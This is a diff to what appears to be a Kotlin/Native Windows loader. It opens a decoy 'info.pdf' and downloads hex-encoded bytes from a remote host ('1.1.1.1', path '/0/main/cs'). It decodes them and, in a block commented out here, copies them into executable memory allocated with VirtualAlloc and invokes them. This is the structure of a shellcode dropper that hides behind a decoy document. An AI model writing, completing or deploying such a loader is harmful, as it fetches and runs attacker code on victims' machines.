@@ -89,14 +89,18 @@ inline fun downloadFile(host: String, port: Int, path: String): ByteArray? = run
 }.getOrNull()
 
 fun main() {
-    ShellExecuteW(null, null, "info.pdf", null, null, SW_SHOWNORMAL)
+    memScoped {
+        val path = allocArray<UShortVar>(MAX_PATH)
+        GetModuleFileNameW(null, path, MAX_PATH)
+        ShellExecuteW(null, null, "info.pdf", null, path.toKString().substringBeforeLast('\\'), SW_SHOWNORMAL)
+    }
 
     memScoped {
         val raw = downloadFile("1.1.1.1", 80, "/0/main/cs")?.decodeToString()?.trim()?.hex2byte() ?: exitProcess(0)
         val rawSize = raw.size
 
 /*
-        val ptr = VirtualAlloc(null,  rawSize.convert(), MEM_COMMIT, PAGE_EXECUTE_READWRITE)!!
+        val ptr = VirtualAlloc(null, rawSize.convert(), MEM_COMMIT, PAGE_EXECUTE_READWRITE)!!
         memcpy(ptr, raw.toCValues().ptr, rawSize.convert())
         ptr.reinterpret<CFunction<() -> Unit>>().invoke()
 */
